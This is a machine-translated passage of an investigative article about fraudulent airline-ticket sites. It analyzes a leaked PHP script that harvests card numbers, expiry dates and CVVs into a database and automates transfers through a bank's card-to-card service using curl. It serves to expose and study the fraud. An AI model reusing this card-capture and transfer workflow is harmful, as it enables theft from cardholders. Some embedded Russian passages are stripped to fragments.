<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>™️ 🥔 ⬅️ Penerbangan murah ... Jaringan situs web palsu yang mencuri uang dari kartu. Investigasi kedua. Apa hubungan Promsvyazbank dengan itu? 💷 🔛 👇</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Sekitar sebulan yang lalu, saya menerbitkan artikel tentang Geektimes, “Tiket pesawat murah ... Atau jaringan situs penipuan yang mencuri uang dari ka...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Penerbangan murah ... Jaringan situs web palsu yang mencuri uang dari kartu. Investigasi kedua. Apa hubungan Promsvyazbank dengan itu?</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/398313/"><img src="https://habrastorage.org/files/dd5/971/335/dd59713351a348f29efad6370c8596f4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekitar sebulan yang lalu, saya menerbitkan artikel tentang Geektimes, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“Tiket pesawat murah ... Atau jaringan situs penipuan yang mencuri uang dari kartu. </font><font style="vertical-align: inherit;">Investigasi saya. " </font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Publikasi ini menerima tanggapan yang luar biasa dan kelanjutan yang tidak terduga ...</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Biarkan saya mengingatkan Anda untuk mereka yang belum membaca bagian pertama. Dalam publikasi berdasarkan kasus nyata, skema digambarkan menggunakan penipu mana yang mencuri uang dari tiket pembeli tiket penerbangan yang gegabah untuk sampai ke situs penjualan tiket palsu. Jumlah situs penipuan semacam itu untuk penjualan tiket pesawat di RuNet ada dalam puluhan dan ratusan (termasuk ditutup). Di situs tersebut, pengguna pertama kali ditampilkan informasi nyata tentang penerbangan, diusulkan untuk melakukan pemesanan dan membayarnya dengan kartu kredit. Semuanya terlihat indah sampai pembeli tiket menemukan bahwa mereka dibiarkan tanpa uang dan tanpa tiket.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dalam semua kasus yang terdeteksi, untuk mencuri uang, situs-situs tersebut menggunakan layanan bank untuk mentransfer uang dari kartu ke kartu (P2P). Pada bagian pertama, mekanisme bagaimana halaman Tinkov Bank untuk pembayaran dari kartu ke kartu disamarkan dan disematkan dalam situs web yang menipu, sehingga "pembeli" tidak melihat apa-apa, dijelaskan secara rinci. Promsvyazbank juga disebutkan - melalui dia bahwa uang dicuri dari kartu korban dalam cerita yang dijelaskan. Dan jika tidak ada pertanyaan yang tersisa dengan bank TKS, maka dalam kasus Promsvyazbank tidak jelas bagaimana uang itu ditarik. Script utama yang digunakan untuk mencuri uang dieksekusi di sisi server dan tanpa kode sumber orang hanya bisa berasumsi apa yang dilakukannya.</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dan salah satu pengguna Geektimes menghubungi saya dan mengirimkan skrip payp2p.php yang baru-baru ini digunakan di sebagian besar situs penjualan tiket pesawat yang curang. </font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Script ini menggunakan layanan Promsvyazbank untuk mentransfer dari kartu ke kartu. </font><font style="vertical-align: inherit;">Dan menurut pendapat saya, Promsvyazbank, menyediakan layanannya, yang mudah dibodohi, berkontribusi pada pertumbuhan jumlah penipu internet.</font></font><a name="habracut"></a><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mungkin ada bank serupa lainnya, tetapi publikasi ini terutama akan berurusan dengan Promsvyazbank. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sebelum kita memulai analisis skrip itu sendiri, mari kita lihat seperti apa halaman pembayaran dari situs web palsu dan seperti apa halaman terjemahan dari kartu ke kartu Promsvyazbank. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Itu tampak seperti halaman pembayaran di situs penipuan</font></font><br>
<img src="https://habrastorage.org/files/fe3/cf3/6d5/fe3cf36d5d294c8aa50b4338e9efde03.jpg"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Saat menganalisis kode HTML halaman pembayaran ini, saya tidak menemukan bagian halaman bank mana pun, iframe bawaan tidak digunakan, skrip tidak digunakan sama sekali, dan halaman itu sendiri sangat sederhana dan tidak terlihat seperti halaman Promsvyazbank. Data yang dimasukkan ke dalam formulir diperiksa bukan oleh skrip, tetapi oleh mekanisme yang dibangun ke dalam peramban - menggunakan atribut "pola" dan "diperlukan" untuk bidang input input dan untuk daftar drop-down yang dipilih. Yaitu bahkan halaman yang disimpan di browser pada drive lokal kemudian tetap "operasional" dan dapat digunakan untuk menguji bagaimana data peta dicegat. Halaman serupa yang disimpan sebelumnya digunakan sebagai bagian dari publikasi ini untuk memahami cara kerja skrip.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Faktanya, halaman ini hanyalah formulir untuk memasukkan nomor kartu. </font><font style="vertical-align: inherit;">Ketika formulir dikonfirmasi, pemrosesan ditransfer ke program payp2p.php.</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"b-card-feature-list clearfix"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"formPay"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">action</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"payp2p.php"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">method</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Payp2p.php dapat melakukan apa saja. </font><font style="vertical-align: inherit;">Kode-nya sebelumnya tidak tersedia bagi kami, karena ini berjalan di sisi server. </font><font style="vertical-align: inherit;">Tapi seperti yang sudah saya tulis, sekarang kita punya kode, dan kita akan tahu segalanya. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang mari kita lihat bagaimana halaman pembayaran terlihat dari kartu ke kartu di situs Promsvyazbank. </font></font><br>
<br>
<code>https://www.psbank.ru/Personal/eCommerce/Card2Card</code><br>
<img src="https://habrastorage.org/files/40d/469/71c/40d46971c2414e28bd4ef695c1e0d665.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seperti yang Anda lihat, halaman Promsvyazbank sama sekali tidak seperti halaman pembayaran yang disajikan sebelumnya. </font><font style="vertical-align: inherit;">Bahkan jumlah kolom input untuk nomor kartu tidak cocok. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita lihat kode HTML halaman PSB untuk mengetahui cara kerjanya. </font><font style="vertical-align: inherit;">Yang perlu kita ketahui adalah dalam beberapa baris berikut:</font></font><br>
<br>
<pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"card2card"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://3ds.payment.ru/P2P/card_form.html"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100%"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"100%"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">frameborder</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">seamless</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">scrolling</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"no"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bagian ini berarti bahwa halaman pembayaran sungguhan terletak pada domain yang berbeda, dan apa yang kita lihat di situs web Promsvyazbank ditampilkan dalam "jendela" menggunakan teknologi iframe. </font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Saya ingin tahu siapa yang memiliki domain 3ds.payment.ru.</font></font></b><div class="spoiler_text">   Whois.<br>
<br>
<code> 3ds.payment.ru<br>
IP 193.200.10.116<br>
 : PRSBM-NET <br>
:<br>
inetnum: 193.200.10.0 - 193.200.10.255<br>
netname: PRSBM-NET<br>
mnt-by: PROMSVYAZBANK-MNT<br>
<br>
C    online.payment.ru<br>
<img src="https://habrastorage.org/files/78b/0d3/8be/78b0d38be13f47f58128095526817a54.png"><br>
</code><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Domain 3ds.payment.ru juga milik Promsvyazbank. Kami akan mengingat domain ini, masih akan ditemukan dalam deskripsi lebih dari sekali. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita lihat apa halaman yang disematkan Promsvyazbank di situsnya, dan mungkin beberapa situs lainnya. </font></font><br>
<br>
<code>https://3ds.payment.ru/P2P/card_form.html</code><br>
<img src="https://habrastorage.org/files/bf7/543/441/bf754344157647e1acf1fb55454c3179.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ini adalah halaman asli yang digunakan untuk transfer dari kartu ke kartu. Seperti yang Anda lihat, halaman ini tanpa batas. Ini dilakukan dengan sengaja untuk membuatnya lebih nyaman untuk dibangun di situs lain. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dalam kode HTML halaman ini kami tertarik pada bagian ini: </font></font><br>
<br>
<img src="https://habrastorage.org/files/8f5/996/3a5/8f59963a5d8c493aa4a38a90c911b92b.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ini adalah kolom input tersembunyi untuk menyimpan informasi layanan. Kami juga akan mengingat halaman ini. Dan di mana itu digunakan akan dijelaskan nanti. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bagian pengantar selesai, mari kita beralih ke bagian yang paling menarik dan lihat bagaimana script payp2p.php bekerja atau bagaimana cara kerjanya.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Skripnya sederhana dan tidak memerlukan pengetahuan mendalam tentang bahasa pemrograman PHP untuk memahaminya. Untuk kenyamanan, saya memecahnya menjadi beberapa bagian. Di sebelah kiri adalah nomor baris yang dapat direferensikan. Script sama sekali tidak berubah dalam bentuk di mana ia diterima. Setelah setiap bagian kode, dekripsi dan contoh nilai-nilai variabel selama eksekusi program akan disajikan (mis. Sesuatu yang mirip dengan debugging). Di beberapa tempat, berkomentar berlebihan mungkin dilakukan - ini dilakukan agar pembaca non-pemrograman juga dapat memahami arti kode program.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untuk pengujian, kami memerlukan formulir di mana Anda harus memasukkan data kartu yang pembayarannya seharusnya. Kami akan menggunakan formulir yang disimpan sebelumnya. Seperti apa bentuknya di situs penipuan ditunjukkan pada gambar di awal artikel. Tentang formulir akan ditulis lebih lanjut di bawah ini. Untuk pengujian, masukkan nomor kartu 1111.2222.3333.4444. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita mulai. </font></font><br>
<br>
<img src="https://habrastorage.org/files/f45/3a9/754/f453a9754241406eb6089527f5e25336.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 3 - tidak menjalankan perintah apa pun. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 4 - File dbconfig.php terpisah dimuat di mana parameter untuk terhubung ke database MySQL disimpan. Tangkapan layar kode dbconfig.php dan analisisnya ada di bawah ini.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 6 - kita terhubung ke server MySQL, di dalam database yang mana kita akan kemudian menyimpan data tentang kartu curian dan transfer uang yang dilakukan. Baris ini secara bersamaan terhubung ke server MySQL dan keluar dari program jika koneksi gagal karena suatu alasan. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 11 - pilih pengodean untuk bekerja dengan database MySQL. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 13 - Kami terhubung ke server MySQL sebelumnya, sekarang kami memilih database yang akan kami gunakan. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Skrip payp2p.php memulai kerjanya setelah pengguna yang ditipu mengisi formulir pada halaman yang mirip dengan halaman pembayaran online reguler. Dengan mengklik tombol “Bayar” pada formulir, skrip payp2p.php menerima data yang dimasukkan dalam formulir. Data dari formulir ke skrip ditransmisikan menggunakan metode POST.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 16 - nomor kartu kredit yang dimasukkan dalam formulir di halaman sebelumnya disimpan ke dalam variabel $ num. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 17 - bulan / tahun masa berlaku kartu disimpan dalam variabel $ date. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 18 - Kode CVV kartu disimpan ke variabel $ cvv. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 19 - dalam variabel $ code, kode tertentu dihasilkan sebelumnya ketika menempatkan "pesanan untuk tiket pesawat". Kode ini digunakan agar pengguna dapat melihat pesanannya melalui tautan khusus. Kode yang sama digunakan untuk mengidentifikasi pesanan (pada halaman pembayaran, untuk secara otomatis menampilkan jumlah pembayaran; jika disimpan oleh scammers ketika menyimpan ke "buku penjualan", kode ini juga dikirimkan ke formulir pembayaran, mungkin sebagai pengidentifikasi transfer (lebih lanjut tentang ini di bawah ini).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 21-22 Suatu baris terbentuk - query SQL, yang kemudian dieksekusi. </font><font style="vertical-align: inherit;">Kueri SQL menambahkan nilai pengidentifikasi pesanan, jumlah, tanggal kedaluwarsa kartu, kode CVV kartu, dan waktu saat ini yang tepat ke tabel 'kartu'. </font><font style="vertical-align: inherit;">Contoh catatan dalam database di bawah ini.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contoh Informasi Debugging</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/051/283/424/0512834248fd4c1fa7498ed3f98e72e7.png"><br>
<br>
        « »      « ».    ,     .    .<br>
<br>
"âáèâ" = ''    ISO8859-1 =&gt;Windows-1251<br>
  ,  .  .</div></div> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untuk sementara waktu mengalihkan perhatian kami ke file dbconfig.php. </font></font><br>
<br>
<img src="https://habrastorage.org/files/100/d2a/13b/100d2a13b3544f60afeeab0efc768b85.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Berikut adalah parameter untuk menghubungkan ke database. </font><font style="vertical-align: inherit;">Dari apa yang mungkin menarik:</font></font><br>
<br>
<blockquote>DBHOST —  ,    MySQL  (    MySQL     ,     ,       )<br>
DBNAME —   <br>
DBUSER —        MySQL<br>
DBPASS —       MySQL <br>
SECURE_AUTH_KEY —      -   .      ,   ,    , .     .</blockquote><br>
<img src="https://habrastorage.org/files/c5c/9bf/0b1/c5c9bf0b1afb4d8ba298ce8953076dee.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 28 - file aviacfg.php pihak ketiga terhubung. Ini adalah file konfigurasi yang menyimpan nomor kartu penerima dan pengaturan lainnya. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 29 - Array dibuat dari nomor kartu yang dipisahkan oleh satu baris dalam file konfigurasi. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 30-31 - Variabel $ crd secara acak menetapkan jumlah salah satu kartu. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita lihat apa yang kita miliki di file aviacfg.php</font></font><br>
<br>
<img src="https://habrastorage.org/files/14b/2bd/b16/14b2bdb16dc74b7990b743146d9bc72c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Di sini kita melihat bahwa variabel $ aviacfg adalah array yang berisi nilai-nilai diskon (diskon) dan kartu (nomor kartu yang diharapkan penarikan). Dalam contoh ini, hanya ada satu nomor kartu, tetapi bisa ada nomornya. Nama file (aviacfg.php) dan variabel ($ aviacfg) itu sendiri menunjukkan area skrip mana yang dipertajam. Nilai diskon menentukan persentase harga pada situs web palsu yang akan ditampilkan lebih murah daripada yang sebenarnya dijual di situs web tiket penerbangan “jujur”. Pemilik situs web palsu dapat dengan cepat membuat harga tiket yang ditampilkan lebih murah. Semakin rendah harga yang ditampilkan, semakin besar kemungkinan salah satu calon pembeli akan berisiko membeli tiket di situs yang tidak dikenal. Tentang diskon akan ada komentar nanti bagaimana tepatnya itu diterapkan dalam kode.</font></font><br>
<br>
<img src="https://habrastorage.org/files/dd5/971/335/dd59713351a348f29efad6370c8596f4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Selanjutnya, jumlah transfer, jumlah kartu tempat transfer dilakukan, dan kode yang mengidentifikasi pesanan tiket pesawat di situs web penipuan disimpan dalam Database MySQL. </font><font style="vertical-align: inherit;">Contoh catatan dalam database akan disajikan di bawah ini.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contoh Informasi Debugging</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/4ee/0e7/b46/4ee0e7b46d584bb68631adb4339b86e9.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/111/e13/e09/111e13e09e2246b4bbb9a3cdb6cab651.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 40 - variabel $ p112 diberi nilai dengan nomor kartu yang dimasukkan sebelumnya dalam formulir. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 41-51 - Nomor kartu dibagi menjadi bagian-bagian dari empat digit. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 53-57 - Panjang nomor kartu diperiksa. Jika dalam nomor kartu jumlah karakter berbeda dari 16 atau 18, terjadi jalan keluar. Pesan ditampilkan selama lima detik, lalu dialihkan ke halaman lain. Dalam contoh ini, pengembaliannya akan ke halaman pesanan di situs penipuan. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sejalan 56 "Iaaa? Iua aaiiua ea? Ou" ketika mengonversi penyandian ISO8859-1 =&gt; Windows-1251 sesuai dengan teks: "Data kartu tidak valid." </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 58-61 - variabel $ p4, $ p5, $ p6, $ p11 diberikan nilai yang dimasukkan sebelumnya dalam formulir (tanggal kedaluwarsa kartu, kode CVV, jumlah pembayaran).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 63 - Dalam variabel $ info semua data kartu dan jumlah transfer disimpan. </font><font style="vertical-align: inherit;">Saat membentuk, jeda baris "\ n" dan pemisah "### ..." digunakan. </font><font style="vertical-align: inherit;">Variabel ini tidak digunakan di tempat lain. </font><font style="vertical-align: inherit;">Saat menyelesaikan skrip, skrip dapat digunakan untuk menyimpan catatan dalam file teks biasa atau untuk ditampilkan saat debugging.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contoh Informasi Debugging</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/413/f55/39d/413f5539d0fa45f3aee1853c62d0005f.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/347/9f7/0d5/3479f70d54804bb2b25f111021820c1c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 66-75 - Ini sebenarnya merupakan duplikasi dari blok garis 27-36. Sekali lagi, kartu penerima dipilih secara acak dari file konfigurasi aviacfg.php, dan semua ini disimpan dalam tabel database card_balance. Dengan demikian, dalam tabel card_balance, dengan setiap upaya untuk mentransfer, dua catatan akan dibuat. Jika hanya satu kartu penerima yang tersumbat di aviacfg.php, dengan pengambilan sampel acak, tentu saja, kartu yang sama akan selalu dipilih. Dalam hal ini, entri dalam tabel card_balance hanya akan diduplikasi. Tetapi jika beberapa nomor kartu tersumbat di aviacfg.php, dengan pengambilan sampel acak hasilnya akan berbeda dan akan ada satu catatan dalam tabel card_balance, yang pertama salah dan yang kedua benar.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ini adalah kesalahan, dan pembeli naskah (akan ada komentar terpisah tentang mereka) dapat meminta pengembang untuk mengkompensasi kerusakan moral yang terkait dengan fakta bahwa terjemahan nyata setidaknya dua kali lebih sedikit dari entri log.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contoh Informasi Debugging</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/33b/867/4db/33b8674db56f462ba652d8caf33b418a.png"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contoh Entri Database MySQL</font></font></b><div class="spoiler_text">        .           : «card»  «card_balance».               ,             .<br>
<br>
,         , —   .      .<br>
<br>
 «card».<br>
<br>
<img src="https://habrastorage.org/files/4e9/e3c/454/4e9e3c45420a4d84b73a857184fe7155.jpg"><br>
<br>
 «card_balance».<br>
<img src="https://habrastorage.org/files/98c/4a0/355/98c4a03559ba40e8a46adb2fdf950b54.jpg"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Harap dicatat bahwa dalam kasus pertama, hanya kartu pengirim tanpa jumlah, tetapi dengan waktu yang tepat, disimpan dalam tabel database MySQL, dan dalam kasus kedua, data tentang transfer yang dilakukan (lebih tepatnya, tentang upaya transfer) disimpan. </font><font style="vertical-align: inherit;">Nomor dan jumlah kartu penerima disimpan, data pengirim tidak disimpan di tabel kedua. </font><font style="vertical-align: inherit;">Dalam kedua kasus, "ID pesanan" juga disimpan.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bagian pertama dari skrip, yang dijelaskan di atas, dapat secara sewenang-wenang disebut "entri dalam buku penjualan untuk akuntansi." Dia tidak memiliki hubungan dengan transfer uang. Untuk mentransfer uang, Anda dapat melakukannya tanpa menyimpan data ke basis data. Namun demikian, kami melihat bahwa data kartu disimpan, yang berarti bahwa di masa depan mereka dapat juga digunakan untuk mencuri uang dari kartu “dalam mode manual”. Data kartu dapat dijual atau digunakan, misalnya, untuk membayar iklan di Yandex.Direct, seperti yang ditunjukkan pada artikel sebelumnya. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bagian kedua dari skrip berkaitan dengan transfer uang melalui situs Promsvyazbank 3ds.payment.ru. </font></font><br>
<br>
<img src="https://habrastorage.org/files/2b4/0cb/7fc/2b40cb7fc61f4b9598409fbfcc5ae00f.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 78 dari komentar menunjukkan bahwa diasumsikan bahwa halaman konfirmasi untuk pembayaran yang berhasil memiliki alamat seperti "/sus.php?cd=BX3FKT". Jika berhasil, pengguna harus dikembalikan ke alamat ini.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 80-91 Untuk melakukan terjemahan, Anda harus terlebih dahulu pergi ke halaman layanan. </font></font><br>
<br>
<code>https://3ds.payment.ru/cgi-bin/get_trans_cond_p2p</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font></font><br>
<img src="https://habrastorage.org/files/e04/5eb/8e4/e045eb8e4a4d42c6be37ff2946da439c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Halaman ini menampilkan sesuatu seperti baris ini:</font></font><br>
<br>
<pre><code class="hljs json">{<span class="hljs-attr"><span class="hljs-attr">"ORDER_NUM"</span></span>:<span class="hljs-string"><span class="hljs-string">"20161027070425023400"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"TIMESTAMP"</span></span>:<span class="hljs-string"><span class="hljs-string">"20161027070425"</span></span>}</code></pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
"ORDER_NUM" adalah ~ "Nomor Pesanan", "TIMESTAMP" adalah cap waktu saat ini. Jika halaman di-refresh, data baru selalu dikeluarkan. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untuk membaca halaman web atau mengirim data ke halaman web, gunakan perintah curl. Curl (cURL) memungkinkan Anda untuk terhubung secara terprogram ke server web menggunakan berbagai protokol, termasuk http dan https. Dalam kasus kami, curl adalah peramban web perangkat lunak yang dapat menyimpan halaman web ke variabel. Halaman yang disimpan dalam variabel adalah garis yang sangat panjang dengan kode sumber HTML halaman ini. Anda dapat bekerja dengan variabel string seperti itu dengan cara yang sama dengan string apa pun - Anda dapat mencari teks, mengganti teks, dll. Keriting dalam skrip yang dijelaskan akan digunakan beberapa kali.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 80 - URL disimpan dalam variabel $ login_url. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 81 - URL disimpan dalam variabel $ agent. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 82 - Menginisialisasi sesi CURL. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 83-90 - Parameter ditetapkan untuk sesi dengan CURL (alamat halaman disimpan sebelumnya dalam $ login_url; pengidentifikasi browser yang sebelumnya disimpan dalam $ agent; halaman dari mana halaman diarahkan atau sebaliknya disebut; REFERER; Pengaturan COOKIE, dll. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baris 91 - Sebagai hasil dari perintah curl_exec, halaman web akan diperoleh secara terprogram, yang akan disimpan dalam variabel $ page. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
